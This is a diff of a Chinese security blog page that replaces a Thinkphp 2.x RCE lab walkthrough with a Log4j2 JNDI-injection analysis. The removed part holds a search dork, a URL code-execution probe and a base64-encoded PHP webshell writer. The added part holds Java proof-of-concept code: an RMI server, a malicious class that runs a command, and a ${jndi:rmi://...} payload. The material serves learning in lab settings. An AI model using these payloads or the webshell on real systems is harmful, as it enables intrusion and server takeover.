@@ -16,30 +16,34 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="vulfocus靶场复现">
+    <meta name="description" content="入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Thinkphp2.x_RCE靶场复现">
-<meta property="og:url" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="Log4j2反序列化漏洞原理分析">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="vulfocus靶场复现">
+<meta property="og:description" content="入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-29-56.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-33-42.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-37-47.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-40-05.png">
-<meta property="article:published_time" content="2023-08-12T12:22:25.000Z">
-<meta property="article:modified_time" content="2024-06-29T03:05:07.993Z">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png">
+<meta property="article:published_time" content="2024-06-10T12:14:42.000Z">
+<meta property="article:modified_time" content="2024-07-07T16:03:03.375Z">
 <meta property="article:author" content="3xsh0re">
-<meta property="article:tag" content="漏洞复现">
-<meta property="article:tag" content="Thinkphp">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java反序列化">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
   
   
   
-  <title>Thinkphp2.x_RCE靶场复现 - 3xsh0re&#39;Blog</title>
+  <title>Log4j2反序列化漏洞原理分析 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -346,7 +350,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Thinkphp2.x_RCE靶场复现"></span>
+            <span id="subtitle" data-typed-text="Log4j2反序列化漏洞原理分析"></span>
           
         </div>
 
@@ -357,8 +361,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-12 20:22" pubdate>
-          2023年8月12日 晚上
+        <time datetime="2024-06-10 20:14" pubdate>
+          2024年6月10日 晚上
         </time>
       </span>
     
@@ -369,7 +373,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          771 字
+          2.5k 字
         
       </span>
     
@@ -380,7 +384,7 @@ mjx-container[display="true"] + br {
         
         
         
-          7 分钟
+          21 分钟
         
       </span>
     
@@ -425,12 +429,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Thinkphp2.x_RCE靶场复现</h1>
+            <h1 id="seo-header">Log4j2反序列化漏洞原理分析</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年6月29日 上午
+                    本文最后更新于：2024年7月8日 凌晨
                   
                 
               </p>
@@ -438,46 +442,56 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>vulfocus靶场复现</p>
+                <p>入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客</p>
 <span id="more"></span>
 
-<h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }</code></p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p>
-<p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'@(w+)'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'([^'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'/]+)@e'</span>, <span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure>
+<h2 id="Log4j2漏洞原理分析"><a href="#Log4j2漏洞原理分析" class="headerlink" title="Log4j2漏洞原理分析"></a>Log4j2漏洞原理分析</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/17793755.html">参考文章</a></p>
+<p>Apache Log4j2是一个基于Java的日志记录工具，当前被广泛应用于业务系统开发，开发者可以利用该工具将程序的输入输出信息进行日志记录。 2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。该漏洞是由于Apache Log4j2某些功能存在递归解析功能，导致攻击者可直接构造恶意请求，触发远程代码执行漏洞，从而获得目标服务器权限。</p>
+<p>漏洞适应版本：2.0 &lt;= Apache log4j2 &lt;=2.14.1。CVE-2021-44228</p>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h4><p>​	log4j2是apache下的java应用常见的开源日志库，就是一个日志记录工具，可以控制日志信息输送的目的地为控制台、文件、GUI组建等，被应用于业务系统开发，用于记录程序输入输出日志信息</p>
+<h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><p>​	JNDI，全称为<strong>Java命名和目录接口</strong>（Java Naming and Directory Interface）,是SUN公司提供的一种标准的Java命名系统接口，<strong>允许从指定的远程服务器获取并加载对象</strong>。<strong>JNDI相当于一个用于映射的字典，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</strong></p>
+<p>​	其实就是可以让Java应用程序可以向远程服务器获取资源的接口，这也是这次利用的关键点，利用时常用的有RMI和LDAP两种服务。</p>
+<h3 id="Java低版本原理"><a href="#Java低版本原理" class="headerlink" title="Java低版本原理"></a>Java低版本原理</h3><h4 id="原理描述"><a href="#原理描述" class="headerlink" title="原理描述"></a>原理描述</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hilaryfrank/article/details/121944757">参考文章</a></p>
+<p>​	Log4j2漏洞总的来说就是：因为Log4j2<strong>默认支持解析ldap/rmi协议</strong>（只要打印的日志中包括ldap/rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。</p>
+<p>​	这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap://localhost:9999/Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</p>
+<h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h4><p>首先我们编写一个测试代码调试一下漏洞是如何形成的：</p>
+<p>RMIServer类：用于开启RMI服务，托管我们的恶意类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> {<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException {<br>        <span class="hljs-comment">//启动rmi服务 端口为1099</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br>        <span class="hljs-comment">//创建资源为本机目录的HackingObj类，其中null代表本机目录，也可以指定服务器，如127.0.0.1:80绑定为本机nginx下资源</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-string">"rmi.HackingObj"</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        <span class="hljs-comment">//绑定资源</span><br>        registry.bind(<span class="hljs-string">"3xsh0re"</span>,referenceWrapper);<br>        System.out.println(<span class="hljs-string">"RMI服务初始化成功!"</span>);<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
-<p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p>
-<p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p>
-<p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span><br></code></pre></td></tr></table></figure>
+<p>HackingObj类：恶意代码类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HackingObj</span> {<br>    <span class="hljs-keyword">static</span> {<br>        System.out.println(<span class="hljs-string">"Hacking!"</span>);<br>        <span class="hljs-keyword">try</span> {<br>            Runtime.getRuntime().exec(<span class="hljs-string">"calc"</span>);<br>        }<span class="hljs-keyword">catch</span> (IOException e) {<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        }<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
-<p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/${@print(THINK_VERSION)}<br></code></pre></td></tr></table></figure>
+<p>上面的都是攻击者构造的。</p>
+<p>测试类：用于测试Log4j2</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">"${jndi:rmi://127.0.0.1/3xsh0re}"</span>;<br>        logger.error(<span class="hljs-string">"run {}"</span>,payload);<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
-<p>写入木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure>
+<h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面打断点调试漏洞路径：先打一个初始断点</p>
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707233903961">首先步进调试到下面的位置
+
+<p>MutableLogEvent.class中168行的位置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">reusable.formatTo(<span class="hljs-built_in">this</span>.getMessageTextForWriting());<br></code></pre></td></tr></table></figure>
+
+<p>然后到ParameterFormatter.class中136行的位置</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">buffer.append(messagePattern, previous, messagePattern.length());<br></code></pre></td></tr></table></figure>
+
+<p>一直调试到下面的位置，然后慢慢调</p>
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707223506436">
+
+<p>调试到PatternFormatter.class中的format函数发现此时在格式化需要打印的日志</p>
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707235601603">
+<p>继续调试，在MessagePatternConverter （第102行）中解析字符串<code>${}</code>：</p>
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707223343811">然后在getStrSubstitutor中调用了resolveVariable (第418行)去触发了JndiLookup函数
+
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707230109954"><img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707231739578"><img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707231833038">
+
+<p>这里调用JndiLookup中的convertJndiName去处理我们的路径</p>
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707230247931">然后调用了JndiManager，并使用JndiManager的lookup函数，然后这个lookup函数最终调用了java原生的lookup函数，导致反序列化远程加载恶意类。
+
+<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707232102120"><img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707230813761">
 
 
 
-<h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-12_20-25-00.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>测试是否存在，拼接路由<code>/index.php/module/action/param1/${@phpinfo()}</code></p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-28-05.png" srcset="/img/loading.gif" lazyload class="">
-
-
-
-<p>使用漏洞利用工具扫描，得到相同的结果</p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-29-56.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>存在<code>tp2_lite_code_exec</code>漏洞，传马Getshell</p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-33-42.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>使用蚁剑连接，</p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-37-47.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>找到flag，通关</p>
-<img src="/2023/08/12/Thinkphp2-x-RCE%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/Snipaste_2023-08-13_16-40-05.png" srcset="/img/loading.gif" lazyload class="">
+<h3 id="Java高版本原理"><a href="#Java高版本原理" class="headerlink" title="Java高版本原理"></a>Java高版本原理</h3><p>后续学习。。。</p>
 
                 
               </div>
@@ -496,7 +510,7 @@ mjx-container[display="true"] + br {
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
   
   
 
@@ -511,9 +525,9 @@ mjx-container[display="true"] + br {
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
       
-        <a href="/tags/Thinkphp/" class="print-no-link">#Thinkphp</a>
+        <a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#Java反序列化</a>
       
     </div>
   
@@ -525,8 +539,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Thinkphp2.x_RCE靶场复现</div>
-      <div>https://3xsh0re.github.io/2023/08/12/Thinkphp2-x-RCE靶场复现/</div>
+      <div>Log4j2反序列化漏洞原理分析</div>
+      <div>https://3xsh0re.github.io/2024/06/10/Log4j2反序列化漏洞原理分析/</div>
     </div>
     <div class="license-meta">
       
@@ -538,7 +552,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月12日</div>
+          <div>2024年6月10日</div>
         </div>
       
       
@@ -570,9 +584,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/14/Google-Hacking%E5%AD%A6%E4%B9%A0/" title="Google_Hacking学习">
+                      <a href="/2024/06/14/leetcode236%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E7%A5%96%E5%85%88%E8%8A%82%E7%82%B9/" title="leetcode236复习二叉树的祖先节点">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Google_Hacking学习</span>
+                        <span class="hidden-mobile">leetcode236复习二叉树的祖先节点</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -580,8 +594,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/10/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8Asrc%E6%8C%96%E6%8E%98-230804/" title="一次公益src挖掘-230804">
-                        <span class="hidden-mobile">一次公益src挖掘-230804</span>
+                      <a href="/2024/06/06/leetcode114%E8%AE%A4%E8%AF%86%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%89%8D%E9%A9%B1%E8%8A%82%E7%82%B9/" title="leetcode114认识二叉树的前驱节点">
+                        <span class="hidden-mobile">leetcode114认识二叉树的前驱节点</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
